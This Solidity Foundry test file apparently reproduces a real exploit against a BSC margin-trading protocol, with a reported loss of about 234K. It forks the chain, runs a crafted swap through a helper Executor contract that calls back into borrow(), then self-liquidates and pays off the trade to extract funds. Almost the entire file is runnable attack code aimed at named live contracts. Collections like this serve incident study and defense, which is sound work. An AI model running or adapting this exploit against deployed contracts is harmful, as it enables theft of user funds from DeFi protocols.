// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~234K
// Attacker : https://bscscan.com/address/0x5bb5b6d41c3e5e41d9b9ed33d12f1537a1293d5f
// Vulnerable Contract : https://bscscan.com/address/0xf436f8fe7b26d87eb74e5446acec2e8ad4075e47
// Attack Tx 1 : https://phalcon.blocksec.com/explorer/tx/bsc/0xf78a85eb32a193e3ed2e708803b57ea8ea22a7f25792851e3de2d7945e6d02d5
// Attack Tx 2 : https://phalcon.blocksec.com/explorer/tx/bsc/0x210071108f3e5cd24f49ef4b8bcdc11804984b0c0334e18a9a2cdb4cd5186067

// @Analysis
// https://twitter.com/0xNickLFranklin/status/1774727539975672136

interface ITradeController {
    function activeTrades(
        address,
        uint16,
        bool
    )
        external
        view
        returns (
            uint256 deposited,
            uint256 held,
            bool depositToken,
            uint128 lastBlockNum
        );

    function getCash() external view returns (uint256);

    function markets(
        uint16
    )
        external
        view
        returns (
            address pool0,
            address pool1,
            address token0,
            address token1,
            uint16 marginLimit,
            uint16 feesRate,
            uint16 priceDiffientRatio,
            address priceUpdater,
            uint256 pool0Insurance,
            uint256 pool1Insurance
        );

    function payoffTrade(uint16 marketId, bool longToken) external payable;

    function marginTrade(
        uint16 marketId,
        bool longToken,
        bool depositToken,
        uint256 deposit,
        uint256 borrow,
        uint256 minBuyAmount,
        bytes memory dexData
    ) external payable returns (uint256);
}

interface ILToken is ICErc20Delegate {
    function availableForBorrow() external view returns (uint256);
}

interface IxOLE is IERC20 {
    function create_lock(uint256 _value, uint256 _unlock_time) external;
}

interface IOPBorrowingDelegator {
    function borrow(
        uint16 marketId,
        bool collateralIndex,
        uint256 collateral,
        uint256 borrowing
    ) external payable;

    function liquidate(
        uint16 marketId,
        bool collateralIndex,
        address borrower
    ) external;
}

contract ContractTest is Test {
    struct SwapDescription {
        address srcToken;
        address dstToken;
        address srcReceiver;
        address dstReceiver;
        uint256 amount;
        uint256 minReturnAmount;
        uint256 flags;
    }
    IERC20 private constant ETH =
        IERC20(0x2170Ed0880ac9A755fd29B2688956BD959F933F8);
    IERC20 private constant USDC =
        IERC20(0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d);
    IERC20 private constant BTCB =
        IERC20(0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c);
    IERC20 private constant BUSDT =
        IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 private constant WBNB =
        IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IERC20 private constant OLE =
        IERC20(0xB7E2713CF55cf4b469B5a8421Ae6Fc0ED18F1467);
    IxOLE private constant xOLE =
        IxOLE(0x71F1158D76aF5B6762D5EbCdEE19105eab2C77d2);
    ILToken private constant LToken =
        ILToken(payable(0x7c5e04894410e98b1788fbdB181FfACbf8e60617));
    Uni_Pair_V2 private constant USDC_OLE =
        Uni_Pair_V2(0x44f508dcDa27E8AFa647cD978510EAC5e63E16a4);
    Uni_Router_V2 private constant Router =
        Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    ITradeController private constant TradeController =
        ITradeController(0x6A75aC4b8d8E76d15502E69Be4cb6325422833B4);
    IOPBorrowingDelegator private constant OPBorrowingDelegator =
        IOPBorrowingDelegator(0xF436F8FE7B26D87eb74e5446aCEc2e8aD4075E47);
    uint16 private constant marketId = 24;

    function setUp() public {
        vm.createSelectFork("bsc", 37470328);
        vm.label(address(ETH), "ETH");
        vm.label(address(USDC), "USDC");
        vm.label(address(BTCB), "BTCB");
        vm.label(address(BUSDT), "BUSDT");
        vm.label(address(WBNB), "WBNB");
        vm.label(address(OLE), "OLE");
        vm.label(address(xOLE), "xOLE");
        vm.label(address(USDC_OLE), "USDC_OLE");
        vm.label(address(Router), "Router");
        vm.label(address(TradeController), "TradeController");
        vm.label(address(OPBorrowingDelegator), "OPBorrowingDelegator");
    }

    function testExploit() public {
        // First TX
        deal(address(this), 5 ether);
        emit log_named_decimal_uint(
            "Exploiter BNB balance before attack",
            address(this).balance,
            18
        );

        USDC.approve(address(Router), type(uint256).max);
        BUSDT.approve(address(Router), type(uint256).max);

        WBNBToOLE();
        // Add liquidity to pair
        OLE.transfer(address(USDC_OLE), OLE.balanceOf(address(this)));
        USDC.transfer(address(USDC_OLE), USDC.balanceOf(address(this)));
        USDC_OLE.mint(address(this));

        // Deposit and lock liquidity
        USDC_OLE.approve(address(xOLE), USDC_OLE.balanceOf(address(this)));
        xOLE.create_lock(1, 1814400 + block.timestamp);

        (
            ,
            ,
            ,
            ,
            uint16 marginLimit,
            uint16 feesRate,
            uint16 priceDiffientRatio,
            ,
            ,

        ) = TradeController.markets(marketId);
        uint256 underlyingWBNBBal = LToken.getCash();
        if (underlyingWBNBBal > 1e14) {
            (bool success, ) = address(LToken).call(
                abi.encodeWithSignature("accrueInterest()")
            );
            require(success, "Call to accrueInterest() not successful");
            uint256 availableBorrow = LToken.availableForBorrow();

            address[] memory path = new address[](3);
            path[0] = address(WBNB);
            path[1] = address(BUSDT);
            path[2] = address(WBNB);
            uint256[] memory amountsOut = Router.getAmountsOut(
                address(this).balance,
                path
            );
            uint256 amountToBorrow = (amountsOut[2] * 3000) / marginLimit;
            uint256[] memory amounts = WBNBToBUSDT();
            BUSDT.approve(address(TradeController), amounts[1]);

            Executor executor = new Executor();
            SwapDescription memory desc = SwapDescription({
                srcToken: address(WBNB),
                dstToken: address(BUSDT),
                srcReceiver: address(executor),
                dstReceiver: address(TradeController),
                amount: amountToBorrow,
                minReturnAmount: 1,
                flags: 4
            });
            bytes memory permit = "";
            bytes memory data = abi.encode(
                address(this),
                address(WBNB),
                address(BUSDT),
                65_560,
                address(OPBorrowingDelegator)
            );
            bytes memory swapData = abi.encodeWithSelector(
                bytes4(0x12aa3caf),
                address(executor),
                desc,
                permit,
                data
            );

            // First byte = Dex ID
            bytes memory dexData = abi.encodePacked(
                bytes5(hex"1500000002"),
                swapData
            );

            TradeController.marginTrade(
                marketId,
                true,
                true,
                amountsOut[1],
                amountToBorrow,
                0,
                dexData
            );

            OPBorrowingDelegator.liquidate(marketId, true, address(this));
        }

        // Second TX
        vm.rollFork(37470331);

        TradeController.markets(marketId);
        TradeController.payoffTrade(marketId, true);
        WBNB.withdraw(WBNB.balanceOf(address(this)));
        BUSDTToWBNB();

        emit log_named_decimal_uint(
            "Exploiter BNB balance after attack",
            address(this).balance,
            18
        );
    }

    receive() external payable {}

    function borrow() external {
        BUSDT.approve(address(OPBorrowingDelegator), type(uint256).max);
        TradeController.markets(marketId);
        OPBorrowingDelegator.borrow(marketId, true, 1_000_000, 0);
    }

    function WBNBToOLE() private {
        address[] memory path = new address[](2);
        path[0] = address(WBNB);
        path[1] = address(USDC);
        Router.swapETHForExactTokens{value: 0.01 ether}(
            100,
            path,
            address(this),
            block.timestamp
        );

        path[0] = address(USDC);
        path[1] = address(OLE);
        Router.swapTokensForExactTokens(
            100,
            100,
            path,
            address(this),
            block.timestamp
        );
    }

    function WBNBToBUSDT() private returns (uint256[] memory amounts) {
        address[] memory path = new address[](2);
        path[0] = address(WBNB);
        path[1] = address(BUSDT);

        amounts = Router.swapExactETHForTokens{value: address(this).balance}(
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function BUSDTToWBNB() private {
        address[] memory path = new address[](2);
        path[0] = address(BUSDT);
        path[1] = address(WBNB);

        Router.swapExactTokensForETH(
            BUSDT.balanceOf(address(this)),
            0,
            path,
            address(this),
            block.timestamp
        );
    }
}

contract Executor {
    IERC20 private constant WBNB =
        IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IERC20 private constant BUSDT =
        IERC20(0x55d398326f99059fF775485246999027B3197955);
    Uni_Router_V2 private constant Router =
        Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    address private immutable owner;

    // address private constant AggregationRouterAddr = 0x1111111254EEB25477B68fb85Ed929f73A960582;

    constructor() {
        owner = msg.sender;
    }

    function execute(address _sender) external {
        WBNB.approve(address(Router), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(WBNB);
        path[1] = address(BUSDT);
        Router.swapExactTokensForTokens(
            WBNB.balanceOf(address(this)),
            1,
            path,
            msg.sender,
            block.timestamp
        );
        (bool success, ) = owner.call(abi.encodeWithSignature("borrow()"));
        require(success, "Call to borrow not successful");
    }
}
